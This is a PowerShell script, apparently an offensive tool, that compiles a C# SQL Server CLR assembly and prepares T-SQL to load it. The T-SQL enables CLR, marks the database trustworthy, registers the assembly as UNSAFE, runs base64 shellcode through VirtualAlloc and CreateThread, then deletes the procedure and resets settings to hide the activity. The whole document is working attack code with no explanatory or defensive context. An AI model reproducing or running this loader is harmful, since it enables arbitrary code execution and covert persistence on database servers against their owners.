$clr_path = "C:\Windows\Temp\tmp.cs"
$clr_command_file = "C:\Users\Administrator\Desktop\exec.txt"
$clr_File = "C:\Windows\Temp\tmp.dll"
$csc = 'C:\Windows\Microsoft.NET\Framework64\v3.5\csc.exe /target:library'
$command = "$csc /out:$clr_File $clr_path"
$clr_payload_temp = @'
using System;

public partial class StoredProcedures
{
    private static Int32 MEM_COMMIT = 0x1000;
    private static IntPtr PAGE_EXECUTE_READWRITE = (IntPtr)0x40;

    [System.Runtime.InteropServices.DllImport("kernel32")]
    private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, UIntPtr size, Int32 flAllocationType, IntPtr flProtect);

    [System.Runtime.InteropServices.DllImport("kernel32")]
    private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, UIntPtr dwStackSize, IntPtr lpStartAddress, IntPtr param, Int32 dwCreationFlags, ref IntPtr lpThreadId);

    [Microsoft.SqlServer.Server.SqlProcedure]
    public static void ExecuteB64Payload(string base64EncodedPayload)
    {
        var bytes = Convert.FromBase64String(base64EncodedPayload);
        var mem = VirtualAlloc(IntPtr.Zero,(UIntPtr)bytes.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(bytes, 0, mem, bytes.Length);
        var threadId = IntPtr.Zero;
        CreateThread(IntPtr.Zero, UIntPtr.Zero, mem, IntPtr.Zero, 0, ref threadId);
    }
}
'@
$clr_command_temp = @'
use msdb;
alter database master set trustworthy on;
exec sp_configure 'show advanced options',1;
reconfigure;
exec sp_configure 'clr enabled',1;
reconfigure;
CREATE ASSEMBLY [clr_test] AUTHORIZATION [dbo] FROM 0x00 WITH PERMISSION_SET = UNSAFE
GO
CREATE PROCEDURE [dbo].[clr_exec] @exec NVARCHAR (MAX) AS EXTERNAL NAME [clr_test].[StoredProcedures].[ExecuteB64Payload];
GO
EXEC[dbo].[clr_exec] 'base64 shellcode'
GO
drop procedure [dbo].[clr_exec];
drop assembly [clr_test];
exec sp_configure 'show advanced options',0;
RECONFIGURE WITH OVERRIDE;
exec sp_configure 'clr enabled',0;
RECONFIGURE WITH OVERRIDE;
'@
[System.IO.File]::WriteAllText($clr_path, $clr_payload_temp)
iex $command
$stringBuilder = New-Object -Type System.Text.StringBuilder
$fileStream = [IO.File]::OpenRead($clr_File)
while (($byte = $fileStream.ReadByte()) -gt -1) {     
    $stringBuilder.Append($byte.ToString("X2")) | Out-Null
    }
$hex = $stringBuilder.ToString() -join ""
$clr_command = $clr_command_temp -replace "00",$hex
[System.IO.File]::WriteAllText($clr_command_file, $clr_command)
$fileStream.close()
[System.IO.File]::Delete($clr_path)
[System.IO.File]::Delete($clr_File)
